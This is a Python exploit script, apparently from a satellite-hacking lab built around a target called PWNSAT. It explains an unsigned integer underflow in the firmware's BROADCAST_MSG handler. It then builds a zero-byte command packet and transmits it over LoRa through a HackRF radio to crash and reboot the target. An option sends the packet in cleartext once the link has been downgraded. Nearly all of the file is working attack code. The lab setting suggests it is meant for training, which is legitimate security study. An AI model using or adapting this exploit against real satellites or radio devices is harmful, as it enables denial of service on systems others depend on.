#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 02_fuzzing_crash_rf.py -- BROADCAST_MSG integer underflow crash.
#
# Root cause: BROADCAST_MSG (APID 0x06) computes
#
#     size_t msg_len = payload_total - 2;
#
# With a 0-byte logical payload, payload_total is 1, so 1 - 2 wraps
# (unsigned) to ~4.29 billion and is passed straight to
# memcpy(..., msg_len) with no bounds check -- the RP2040 hard-faults and
# reboots.
#
# Usage:
#   ./02_fuzzing_crash.py
#   ./02_fuzzing_crash.py --encrypt=off   # link must be downgraded first (see 04)
#
# Expected: FlatSat serial console freezes mid-line, USB CDC ports drop and
# re-enumerate a few seconds later. On PWNSAT-C3: REBOOT DETECTED, uptime
# resets to 0.

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from pwnsat_packets import build_command_packet  # noqa: E402

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--device-args", default="hackrf", help="SoapySDR driver, e.g. 'hackrf'")
    parser.add_argument("--gain", type=int, default=47, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--frequency", type=int, default=UPLINK_FREQ_HZ, help="Hz")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output (shown by default as "
                             "visible proof this is a real RF transmission, not just "
                             "this script's own print statements)")
    args = parser.parse_args()

    # Empty payload_hex overrides "broadcast"'s normal payload -- that's the
    # whole exploit.
    raw_spp = build_command_packet(
        "broadcast", seq=args.seq, encrypt=(args.encrypt == "on"), payload_hex=b""
    )

    print(f"[*] BROADCAST_MSG packet with a 0-byte payload ({'encrypted' if args.encrypt == 'on' else 'cleartext'}, "
          f"seq={args.seq}): {raw_spp.hex()}")
    print("[*] This is the entire exploit -- msg_len = payload_total - 2 underflows "
          "to ~4.29 billion on the firmware side once this decrypts to 0 bytes.")
    print(f"[*] Transmitting on {args.frequency / 1e6:.3f} MHz via {args.device_args} "
          f"(gain={args.gain} dB)...")

    transmit_packet(raw_spp, frequency=args.frequency, device_args=args.device_args,
                    tx_gain=args.gain, verbose=not args.quiet)

    print("[+] Sent. Check the FlatSat's serial console / PWNSAT-C3 for a crash+reboot.")


if __name__ == "__main__":
    main()
